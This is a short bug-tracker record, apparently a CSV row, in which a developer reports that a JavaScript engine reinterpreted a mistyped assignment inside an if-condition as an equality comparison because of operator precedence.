27488,The JavaScript engine likes to think that   if (a = b) was mistyped as   if (a == b) which it usually is. However I had mistyped   if (a == b && c == d) as   if (a = b && c == d) which (because of precedence of =) compiled (after JS warning) as   if (a == (b && c == d)) If I hadn't had JS warnings on I would have been really confused.,"In JS strict mode, |if (a = b && c == d)| compiles as |if (a == (b && c == d))|"
